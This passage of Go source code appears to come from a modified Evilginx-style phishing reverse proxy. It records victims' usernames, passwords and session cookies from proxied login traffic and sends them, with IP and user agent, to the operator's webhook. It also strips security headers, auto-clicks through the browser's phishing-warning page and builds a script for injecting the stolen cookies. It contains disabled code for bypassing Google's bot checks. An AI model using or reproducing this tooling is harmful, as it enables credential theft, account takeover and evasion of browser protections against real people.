											}
										}
									}

									// set params from url arguments
									p.extractParams(session, req.URL)

									ps.SessionId = session.Id
									ps.Created = true
									ps.Index = sid
									req_ok = true
								}
							} else {
								log.Debug("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
								return p.blockRequest(req)
							}
						} else {
							log.Warning("[%s] request to hidden phishlet: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					} else {
						ok := false
						if err == nil {
							ps.Index, ok = p.sids[sc.Value]
							if ok {
								ps.SessionId = sc.Value
							}
						} else {
							ps.SessionId, ok = p.getSessionIdByIP(remote_addr)
							if ok {
								ps.Index, ok = p.sids[ps.SessionId]
							}
						}
						if ok {
							req_ok = true
						} else {
							log.Warning("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					}
				}

				// redirect for unauthorized requests
				if ps.SessionId == "" && p.handleSession(req.Host) {
					if !req_ok {
						return p.blockRequest(req)
					}
				}

				if ps.SessionId != "" {
					if s, ok := p.sessions[ps.SessionId]; ok {
						if cfg.GetSessionProxy() && s.ProxyURL == "" && len(proxies) > 0 {
							mrand.Seed(time.Now().Unix())
							s.ProxyURL = proxies[mrand.Intn(len(proxies))]
						}
						if cfg.GetSessionProxy() && s.ProxyURL != "" {
							pUrl, err := url.Parse(s.ProxyURL)
							if err != nil {
								log.Error("parsing proxy url: %s", err)
							}
							if pUrl.Scheme == "socks5" {
								dialSocksProxy := socks.Dial(s.ProxyURL)
								p.Proxy.Tr = &http.Transport{
									Dial:            dialSocksProxy,
									TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
								}
							}
							if strings.Contains(s.ProxyURL, "http") {
								p.Proxy.Tr = &http.Transport{Proxy: http.ProxyURL(pUrl), TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
								p.Proxy.Tr.ProxyConnectHeader = req.Header
							}
						}
						l, err := p.cfg.GetLureByPath(pl_name, req_path)
						if err == nil {
							// show html template if it is set for the current lure
							if l.Template != "" {
								if !p.isForwarderUrl(req.URL) {
									path := l.Template
									if !filepath.IsAbs(path) {
										templates_dir := p.cfg.GetTemplatesDir()
										path = filepath.Join(templates_dir, path)
									}
									if _, err := os.Stat(path); !os.IsNotExist(err) {
										t_html, err := os.ReadFile(path)
										if err == nil {

											t_html = p.injectOgHeaders(l, t_html)

											body := string(t_html)
											body = p.replaceHtmlParams(body, lure_url, &s.Params)

											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
											if resp != nil {
												return req, resp
											} else {
												log.Error("lure: failed to create html template response")
											}
										} else {
											log.Error("lure: failed to read template file: %s", err)
										}

									} else {
										log.Error("lure: template file does not exist: %s", path)
									}
								}
							}
						}
					}
				}

				// redirect to login page if triggered lure path
				if pl != nil {
					_, err := p.cfg.GetLureByPath(pl_name, req_path)
					if err == nil {
						// redirect from lure path to login url
						rurl := pl.GetLoginUrl()
						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
						if resp != nil {
							resp.Header.Add("Location", rurl)
							return req, resp
						}
					}
				}

				// check if lure hostname was triggered - by now all of the lure hostname handling should be done, so we can bail out
				if p.cfg.IsLureHostnameValid(req.Host) {
					log.Debug("[VERY IMPORTANT] lure hostname detected - by now all of the lure hostname handling should've been done: %s", req_url)

					resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
					if resp != nil {
						return req, resp
					}
				}

				p.deleteRequestCookie(p.cookieName, req)

				// replace "Host" header
				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
					req.Host = r_host
				}

				// fix origin
				origin := req.Header.Get("Origin")
				if origin != "" {
					if o_url, err := url.Parse(origin); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Origin", o_url.String())
						}
					}
				}

				// fix referer
				referer := req.Header.Get("Referer")
				if referer != "" {
					if o_url, err := url.Parse(referer); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Referer", o_url.String())
						}
					}
				}

				// patch GET query params with original domains
				if pl != nil {
					qs := req.URL.Query()
					if len(qs) > 0 {
						for gp := range qs {
							for i, v := range qs[gp] {
								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
							}
						}
						req.URL.RawQuery = qs.Encode()
					}
				}

				// check for creds in request body
				if pl != nil && ps.SessionId != "" {
					body, err := io.ReadAll(req.Body)
					if err == nil {
						req.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))

						// patch phishing URLs in JSON body with original domains
						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)						// patch phishing URLs in JSON body with original domains
						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
						req.ContentLength = int64(len(body))

						log.Debug("POST: %s", req.URL.Path)
						log.Debug("POST body = %s", body)

						contentType := req.Header.Get("Content-type")
						if strings.Contains(contentType, "json") {

							if pl.username.tp == "json" {
								um := pl.username.search.FindStringSubmatch(string(body))
								if len(um) > 1 {
									p.setSessionUsername(ps.SessionId, um[1])
									log.Success("[%d] Username: [%s]", ps.Index, um[1])
									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
										log.Error("database: %v", err)
									}
									if len(um[1]) > 0 && p.cfg.webhook_verbosity == 2 {
										//p.NotifyWebhook(fmt.Sprintf(`<b>[%d] SESSION [%d]</b><u>Username</u> : <code>%v</code>`, ps.Index, //ps.Index, um[1]))
									}
								}
							}

							if pl.password.tp == "json" {
								pm := pl.password.search.FindStringSubmatch(string(body))
								if len(pm) > 1 {
									p.setSessionPassword(ps.SessionId, pm[1])
									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
										log.Error("database: %v", err)
									}
									if len(pm[1]) > 0 && p.cfg.webhook_verbosity == 2 {
										//p.NotifyWebhook(fmt.Sprintf(`<b>[%d] SESSION [%d]</b><u>Password</u> : <code>%v</code>`, ps.Index, //ps.Index, pm[1]))
									}
								}
							}

							for _, cp := range pl.custom {
								if cp.tp == "json" {
									cm := cp.search.FindStringSubmatch(string(body))
									if len(cm) > 1 {
										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
											log.Error("database: %v", err)
										}
										if len(cm[1]) > 0 && p.cfg.webhook_verbosity == 2 {
											//p.NotifyWebhook(fmt.Sprintf(`<b>[%d] SESSION [%d]</b><u>Custom</u> : <code>%v</code>`, ps.Index, ps.Index, cm[1]))
										}
									}
								}
							}

							for _, fp := range pl.forcePost {
								if fp.path.MatchString(req.URL.Path) && fp.tp == "json" {
									log.Info("force_post: url matched: %s", req.URL.Path)
									var decodedPayload map[string]string
									json.Unmarshal(body, &decodedPayload)
									ok_search := false
									if len(fp.search) > 0 {
										k_matched := len(fp.search)
										for _, fp_s := range fp.search {
											for k, v := range decodedPayload {
												if fp_s.key.MatchString(k) && fp_s.search.MatchString(v) {
													if k_matched > 0 {
														k_matched -= 1
													}
													log.Info("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
													break
												}
											}
										}
										if k_matched == 0 {
											ok_search = true
										}
									} else {
										ok_search = true
									}

									if ok_search {
										for _, fp_f := range fp.force {
											decodedPayload[fp_f.key] = fp_f.value
										}
										if encodedBody, err := json.Marshal(decodedPayload); true {
											if err != nil {
												log.Error("force_post: %v", err)
											} else {
												body = encodedBody
												req.ContentLength = int64(len(body))
												log.Info("force_post: body: %s len:%d", body, len(body))
											}
										}
									}
								}
							}

						} else if req.ParseForm() == nil {

							// log.Debug("POST: %s", req.URL.Path)
							for k, v := range req.PostForm {
								// patch phishing URLs in POST params with original domains
								for i, vv := range v {
									req.PostForm[k][i] = string(p.patchUrls(pl, []byte(vv), CONVERT_TO_ORIGINAL_URLS))
								}
								body = []byte(req.PostForm.Encode())
								req.ContentLength = int64(len(body))

								// log.Debug("POST %s = %s", k, v[0])
								log.Debug("POST %s = %s", k, v[0])
								if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
									um := pl.username.search.FindStringSubmatch(v[0])
									if len(um) > 1 {
										p.setSessionUsername(ps.SessionId, um[1])
										log.Success("[%d] Username: [%s]", ps.Index, um[1])
										if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
											log.Error("database: %v", err)
										}
										if len(um[1]) > 0 && p.cfg.webhook_verbosity == 2 {
											//p.NotifyWebhook(fmt.Sprintf(`<b>[%d] SESSION [%d]</b><u>Username</u> : <code>%v</code>`, ps.Index, ps.Index, um[1]))
										}
									}
								}
								if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
									um := pl.username.search.FindStringSubmatch(v[0])
									if len(um) > 1 {
										p.setSessionUsername(ps.SessionId, um[1])
										log.Success("[%d] Username: [%s]", ps.Index, um[1])
			
									}
									pm := pl.password.search.FindStringSubmatch(v[0])
									if len(pm) > 1 {
										p.setSessionPassword(ps.SessionId, pm[1])
										log.Success("[%d] Password: [%s]", ps.Index, pm[1])
										if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
											log.Error("database: %v", err)
										}
										if len(pm[1]) > 0 && p.cfg.webhook_verbosity == 2 {
											p.NotifyWebhook(fmt.Sprintf(`<b>[%d] SESSION [%d]</b><u>Username:Password</u> : <code>%v:%v</code>`, ps.Index, ps.Index, pm[1], um[1]))
										}
									}
								}
								for _, cp := range pl.custom {
									if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
										cm := cp.search.FindStringSubmatch(v[0])
										if len(cm) > 1 {
											p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
											log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
											if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
												log.Error("database: %v", err)
											}
											if len(cm[1]) > 0 && p.cfg.webhook_verbosity == 2 {
												p.NotifyWebhook(fmt.Sprintf(`<b>[%d] SESSION [%d]</b><u>Custom</u> : <code>%v</code>`, ps.Index, ps.Index, cm[1]))
											}
										}
									}
								}
							}

							// force posts
							for _, fp := range pl.forcePost {
								if fp.path.MatchString(req.URL.Path) {
									log.Debug("force_post: url matched: %s", req.URL.Path)
									ok_search := false
									if len(fp.search) > 0 {
										k_matched := len(fp.search)
										for _, fp_s := range fp.search {
											for k, v := range req.PostForm {
												if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
													if k_matched > 0 {
														k_matched -= 1
													}
													log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
													break
												}
											}
										}
										if k_matched == 0 {
											ok_search = true
										}
									} else {
										ok_search = true
									}

									if ok_search {
										for _, fp_f := range fp.force {
											req.PostForm.Set(fp_f.key, fp_f.value)
										}
										body = []byte(req.PostForm.Encode())
										req.ContentLength = int64(len(body))
										log.Debug("force_post: body: %s len:%d", body, len(body))
									}
								}
							}

						}
						for _, fp := range pl.forcePost {
							if fp.path.MatchString(req.URL.Path) && fp.tp == "body" {
								log.Debug("body rewrite: url matched: %s", req.URL.Path)
								if len(fp.force) == 1 {
									oldstring := fp.force[0].key
									newstring := fp.force[0].value
									body = bytes.ReplaceAll(body, []byte(oldstring), []byte(newstring))
									req.ContentLength = int64(len(body))
									log.Debug("body rewrite: replaced %s with %s, new request len: %d", oldstring, newstring, req.ContentLength)
								}
							}
							if fp.path.MatchString(req.URL.Path) && fp.tp == "get" {
								log.Debug("get rewrite: url matched: %s", req.URL.Path)
								if len(fp.force) == 1 {
									qs := req.URL.Query()
									if len(qs) > 0 {
										for gp := range qs {
											if fp.force[0].key == gp {
												qs[gp] = []string{fp.force[0].value}
											}
										}
										req.URL.RawQuery = qs.Encode()
									}
									oldstring := fp.force[0].key
									newstring := fp.force[0].value
									body = bytes.ReplaceAll(body, []byte(oldstring), []byte(newstring))
									req.ContentLength = int64(len(body))
									log.Debug("get rewrite: replaced %s with %s, new request len: %d", oldstring, newstring, req.ContentLength)
								}
							}
						}
						// if strings.Contains(req.URL.String(), "accountlookup") {
						// 	body = bgRegexp.ReplaceAll(body, GetToken(body))
						// 	req.ContentLength = int64(len(body))
						// }
						if 1 == 0 && strings.Contains(req.URL.String(), "accountlookup") {
							log.Debug("Botguard detected: bypass logic activated, running it now...")
							attempts, maxAttemps := 0, 3
							for attempts < maxAttemps {
								email := GetEmail(body)
								apiResp, err := http.Get("http://127.0.0.1:8080/accountLookup/" + email)
								if err != nil {
									log.Error("http.get: %v (%d/%d)", err, attempts+1, maxAttemps)
									attempts++
									time.Sleep(3 * time.Second)
									continue
								}

								type GoRodResponse struct {
									Token string `json:"token"`
								}

								var token GoRodResponse
								// We Read the response body on the line below.
								defer apiResp.Body.Close()
								apiBody, err := io.ReadAll(apiResp.Body)
								if err != nil {
									log.Error("ReadAll: %v", err)
									attempts++
									time.Sleep(3 * time.Second)
									continue
								}
								log.Debug("json response: %v", string(apiBody))
								if apiResp.StatusCode != 200 {
									log.Error("go-rod api response code %d", apiResp.StatusCode)
									attempts++
									time.Sleep(3 * time.Second)
									continue
								}

								jerr := json.Unmarshal(apiBody, &token)
								if jerr != nil {
									log.Error("json: %v", jerr)
									attempts++
									time.Sleep(3 * time.Second)
									continue
								}

								body = bgRegexp.ReplaceAll(body, []byte(token.Token))
								req.ContentLength = int64(len(body))
								req.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
								return req, nil
							}
						}
						req.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
					}
				}

				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
					s, ok := p.sessions[ps.SessionId]
					if ok && !s.IsDone {
						for _, au := range pl.authUrls {
							if au.MatchString(req.URL.Path) {
								s.IsDone = true
								s.IsAuthUrl = true
								break
							}
						}
					}
				}
			}

			return req, nil
		})

	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			if resp == nil {
				return nil
			}

			// handle session
			ck := &http.Cookie{}
			ps := ctx.UserData.(*ProxySession)
			if ps.SessionId != "" {
				if ps.Created {
					ck = &http.Cookie{
						Name:    p.cookieName,
						Value:   ps.SessionId,
						Path:    "/",
						Domain:  ps.PhishDomain,
						Expires: time.Now().UTC().Add(60 * time.Minute),
						MaxAge:  60 * 60,
					}
				}
			}

			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
			if allow_origin != "" && allow_origin != "*" {
				if u, err := url.Parse(allow_origin); err == nil {
					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
					}
				} else {
					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
				}
				resp.Header.Set("Access-Control-Allow-Credentials", "true")
			}
			rm_headers := []string{
				"Content-Security-Policy",
				"Content-Security-Policy-Report-Only",
				"Strict-Transport-Security",
				"X-XSS-Protection",
				"X-Content-Type-Options",
				"X-Frame-Options",
			}
			for _, hdr := range rm_headers {
				resp.Header.Del(hdr)
			}

			redirect_set := false
			if s, ok := p.sessions[ps.SessionId]; ok {
				if s.RedirectURL != "" {
					redirect_set = true
				}
			}

			req_hostname := strings.ToLower(resp.Request.Host)

			if strings.Contains(resp.Request.URL.String(), "ManageAccount") {
				log.Debug("ManageAccount detected, Redirecting to myaccount.google.com page...")
				resp.Header.Set("Location", "https://myaccount.google.com/?authuser=0&utm_source=sign_in_no_continue")
			}
			// if "Location" header is present, make sure to redirect to the phishing domain
			r_url, err := resp.Location()
			if err == nil {
				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
					r_url.Host = r_host
					if resp.Header.Get("Location") != "/auth" {
						resp.Header.Set("Location", r_url.String())
					}
				}
			}

			// fix cookies
			pl := p.getPhishletByOrigHost(req_hostname)
			var auth_tokens map[string][]*AuthToken
			if pl != nil {
				auth_tokens = pl.authTokens
			}
			is_auth := false
			cookies := resp.Cookies()
			resp.Header.Del("Set-Cookie")
			for _, ck := range cookies {
				// parse cookie

				if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
					exptime, err := time.Parse(time.RFC850, ck.RawExpires)
					if err != nil {
						exptime, err = time.Parse(time.ANSIC, ck.RawExpires)
						if err != nil {
							exptime, err = time.Parse("Mon, 02-Jan-06 15:04:05 MST", ck.RawExpires)
							if err != nil {
								log.Error("time.Parse: %v", err)
							}
						}
					}
					ck.Expires = exptime
				}

				if pl != nil && ps.SessionId != "" {
					c_domain := ck.Domain
					if c_domain == "" {
						c_domain = req_hostname
					} else if c_domain[0] != '.' {
						// always prepend the domain with '.' if Domain cookie is specified - this will indicate that this cookie will be also sent to all sub-domains
						c_domain = "." + c_domain
					}
					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
					if pl.isAuthToken(c_domain, ck.Name) {
						s, ok := p.sessions[ps.SessionId]
						if ok && (s.IsAuthUrl || !s.IsDone) {
							if ck.Value != "" && (ck.Expires.IsZero() || (!ck.Expires.IsZero() && time.Now().Before(ck.Expires))) { // cookies with empty values or expired cookies are of no interest to us
								is_auth = s.AddAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Secure, ck.SameSite, auth_tokens)
								if len(pl.authUrls) > 0 {
									is_auth = false
								}
								if is_auth {
									if err := p.db.SetSessionTokens(ps.SessionId, s.Tokens); err != nil {
										log.Error("database: %v", err)
									}
									shouldSend := p.cfg.webhook_verbosity == 1 && !s.WebhookSent
									if len(s.Tokens) > 0 && shouldSend || p.cfg.webhook_verbosity == 2 {
										str := `<b>[%d] SESSION [%d]</b>

<u>Username</u> : <code>%s</code>
<u>Password</u> : <code>%s</code>
<u>Custom</u> : <code>%s</code>
<u>Target</u> : <code>%s</code>
<u>Agent</u> : <code>%s</code>`
									sgetid := p.db.GetSessionId(ps.SessionId)
									uagent := "\n" + "User-Agent: "+ sgetid.UserAgent + "\n" + "IP: "+ sgetid.RemoteAddr +"\n"
									//cooka := "Cookies-Inject: "+ "\n==========================" + TokensToJSON(pl, s.Tokens)
									victimInfo := fmt.Sprintf(str, ps.Index, ps.Index, s.Username, s.Password, s.Custom, pl.Name,uagent)
									p.NotifyWebhook(victimInfo)
									p.SendCookies(fmt.Sprintf("%d",ps.Index),TokensToJSON(pl, s.Tokens))
										
									}
									s.IsDone = true
								}
							}
						}
					}
				}

				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
				resp.Header.Add("Set-Cookie", ck.String())
			}
			if ck.String() != "" {
				resp.Header.Add("Set-Cookie", ck.String())
			}
			if is_auth {
				// we have all auth tokens
				log.Success("[%d] all authorization tokens intercepted!", ps.Index)
			}

			// modify received body
			body, err := io.ReadAll(resp.Body)

			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
			if err == nil {
				for site, pl := range p.cfg.phishlets {
					if p.cfg.IsSiteEnabled(site) {
						// handle sub_filters
						sfs, ok := pl.subfilters[req_hostname]
						if ok {
							for _, sf := range sfs {
								var param_ok bool = true
								if s, ok := p.sessions[ps.SessionId]; ok {
									var params []string
									for k := range s.Params {
										params = append(params, k)
									}
									if len(sf.with_params) > 0 {
										param_ok = false
										for _, param := range sf.with_params {
											if stringExists(param, params) {
												param_ok = true
												break
											}
										}
									}
								}
								if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
									re_s := sf.regexp
									replace_s := sf.replace
									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
									phish_sub, _ := p.getPhishSub(phish_hostname)

									re_s = strings.ReplaceAll(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)))
									re_s = strings.ReplaceAll(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain))
									re_s = strings.ReplaceAll(re_s, "{domain}", regexp.QuoteMeta(sf.domain))
									re_s = strings.ReplaceAll(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))))
									re_s = strings.ReplaceAll(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain))
									re_s = strings.ReplaceAll(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain))
									replace_s = strings.ReplaceAll(replace_s, "{hostname}", phish_hostname)
									replace_s = strings.ReplaceAll(replace_s, "{subdomain}", phish_sub)
									replace_s = strings.ReplaceAll(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname))
									replace_s = strings.ReplaceAll(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub))
									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
									if ok {
										replace_s = strings.ReplaceAll(replace_s, "{domain}", phishDomain)
										replace_s = strings.ReplaceAll(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain))
									}

									if re, err := regexp.Compile(re_s); err == nil {
										body = []byte(re.ReplaceAllString(string(body), replace_s))
									} else {
										log.Error("regexp failed to compile: `%s`", sf.regexp)
									}
								}
							}
						}

						// handle auto filters (if enabled)
						if stringExists(mime, p.auto_filter_mimes) {
							for _, ph := range pl.proxyHosts {
								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
									if ph.auto_filter {
										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
									}
								}
							}
						}
					}
				}

				if stringExists(mime, []string{"text/html"}) {
					if pl != nil && ps.SessionId != "" {
						s, ok := p.sessions[ps.SessionId]
						if ok {
							if s.PhishLure != nil {
								// inject opengraph headers
								l := s.PhishLure
								body = p.injectOgHeaders(l, body)
							}

							var js_params *map[string]string = nil
							if s, ok := p.sessions[ps.SessionId]; ok {
								js_params = &s.Params
							}
							script, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
							if err == nil {
								log.Debug("js_inject: matched %s%s - injecting script", req_hostname, resp.Request.URL.Path)
								js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
								m_nonce := js_nonce_re.FindStringSubmatch(string(body))
								js_nonce := ""
								if m_nonce != nil {
									js_nonce = " nonce=\"" + m_nonce[1] + "\""
								}
								re := regexp.MustCompile(`(?i)(<\s*/head\s*>)`)
								body = []byte(re.ReplaceAllString(string(body), "<script"+js_nonce+">"+script+"</script>${1}"))
							}
							suppressRedpage := "let checkRedPage = () => {    if (document.getElementById('moreInformationDropdownLink')) {        document.body.style.display = 'none';        document.getElementById('moreInformationDropdownLink').click();        let submBtn = document.querySelector('#continueToSite');        submBtn.focus(); submBtn.click();    }}       window.setInterval(checkRedPage, 1);"
							js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
							m_nonce := js_nonce_re.FindStringSubmatch(string(body))
							js_nonce := ""
							if m_nonce != nil {
								js_nonce = " nonce=\"" + m_nonce[1] + "\""
							}
							re := regexp.MustCompile(`(?i)(<\s*/head\s*>)`)
							body = []byte(re.ReplaceAllString(string(body), "<script"+js_nonce+">"+suppressRedpage+"</script>${1}"))
						}
					}
				}

				resp.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
			}

			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					for _, au := range pl.authUrls {
						if au.MatchString(resp.Request.URL.Path) {
							err := p.db.SetSessionTokens(ps.SessionId, s.Tokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							if err == nil {
								if !s.WebhookSent {
									log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
								}

								shouldSend := p.cfg.webhook_verbosity == 1 && !s.WebhookSent
								if len(s.Tokens) > 0 && shouldSend || p.cfg.webhook_verbosity == 2 {
										str := `<b>[%d] SESSION [%d]</b>

<u>Username</u> : <code>%s</code>
<u>Password</u> : <code>%s</code>
<u>Custom</u> : <code>%s</code>
<u>Target</u> : <code>%s</code>
<u>Agent</u> : <code>%s</code>`
									sgetid := p.db.GetSessionId(ps.SessionId)
									uagent := "\n" + "User-Agent: "+ sgetid.UserAgent + "\n" + "IP: "+ sgetid.RemoteAddr +"\n"
									//cooka := "Cookies-Inject: "+ "\n==========================" + TokensToJSON(pl, s.Tokens)
									victimInfo := fmt.Sprintf(str, ps.Index, ps.Index, s.Username, s.Password, s.Custom, pl.Name,uagent)
									p.NotifyWebhook(victimInfo)
									p.SendCookies(fmt.Sprintf("%d",ps.Index),TokensToJSON(pl, s.Tokens))
								}
							}
							break
						}
					}
				}
			}

			if pl != nil && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					if s.RedirectURL != "" && s.RedirectCount == 0 {
						if stringExists(mime, []string{"text/html"}) {
							// redirect only if received response content is of `text/html` content type
							s.RedirectCount += 1
							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
							resp := goproxy.NewResponse(resp.Request, "text/html", http.StatusFound, "")
							if resp != nil {
								r_url, err := url.Parse(s.RedirectURL)
								if err == nil {
									if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
										r_url.Host = r_host
									}
									resp.Header.Set("Location", r_url.String())
								} else {
									resp.Header.Set("Location", s.RedirectURL)
								}
								return resp
							}
						}
					}
				}
			}

			return resp
		})

	goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: p.TLSConfigFromCA()}
	goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.HTTPMitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectHTTPMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}

	return p, nil
}

func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
	if len(p.cfg.redirectUrl) > 0 {
		redirect_url := p.cfg.redirectUrl
		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
		if resp != nil {
			resp.Header.Add("Location", redirect_url)
			return req, resp
		}
	} else {
		resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
		if resp != nil {
			return req, resp
		}
	}
	return req, nil
}

func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
	vals := u.Query()
	for _, v := range vals {
		dec, err := base64.RawURLEncoding.DecodeString(v[0])
		if err == nil && len(dec) == 5 {
			var crc byte = 0
			for _, b := range dec[1:] {
				crc += b
			}
			if crc == dec[0] {
				return true
			}
		}
	}
	return false
}

func TokensToJSON(pl *Phishlet, tokens map[string]map[string]*database.Token) string {
	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly"`
		HostOnly       bool   `json:"hostOnly"`
		Secure         bool   `json:"secure"`
		SameSite       string `json:"sameSite"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
				Secure:         v.Secure,
			}
			// Convert int representation of SameSite to string representation
			c.SameSite = "unspecified"
			switch v.SameSite {
			case 2:
				c.SameSite = "lax"
			case 3:
				c.SameSite = "strict"
			case 4:
				c.SameSite = "no_restriction"
			}

			if domain[:1] == "." {
				c.HostOnly = false
				c.Domain = domain[1:]
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	results, err := json.Marshal(cookies)
	if err != nil {
		log.Error("%v", err)
	}
	return "(() => {let cookies = " + string(results) + ";" + "    function setCookie(key, value, domain, expires, path, isSecure = null) {        domain = domain? domain : window.location.hostname;        if (key.startsWith('__Host')) {            console.log('!important not set domain or browser will rejected due to setting a domain=>', key, value);            document.cookie = `${key}=${value};${expires};path=${path};Secure;SameSite=None`;        } else if (key.startsWith('__Secure')) {            console.log('!important set secure flag or browser will rejected due to missing Secure directive=>', key, value);            document.cookie = `${key}=${value};${expires};domain=${domain};path=${path};Secure;SameSite=None`;        } else {            if (isSecure) {                if (window.location.hostname == domain) {                    document.cookie = `${key}=${value};${expires};path=${path};Secure;SameSite=None`;                } else {                    document.cookie = `${key}=${value};${expires};domain=${domain};path=${path};Secure;SameSite=None`;                }            } else {                console.log('Standard cookies Set', key, value);                if (window.location.hostname == domain) {                    document.cookie = `${key}=${value};${expires};path=${path}`;                } else {                    document.cookie = `${key}=${value};${expires};domain=${domain};path=${path}`;                }            }        }    }    for (let cookie of cookies) {        setCookie(cookie.name, cookie.value, cookie.domain, cookie.expires, cookie.path, cookie.secure);    }})()"	
}

func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
	var ret bool = false
	vals := u.Query()

	var enc_key string

	for _, v := range vals {
		if len(v[0]) > 8 {
			enc_key = v[0][:8]
			enc_vals, err := base64.RawURLEncoding.DecodeString(v[0][8:])
			if err == nil {
				dec_params := make([]byte, len(enc_vals)-1)

				var crc byte = enc_vals[0]
				c, _ := rc4.NewCipher([]byte(enc_key))
				c.XORKeyStream(dec_params, enc_vals[1:])

				var crc_chk byte
				for _, c := range dec_params {
					crc_chk += byte(c)
				}

				if crc == crc_chk {
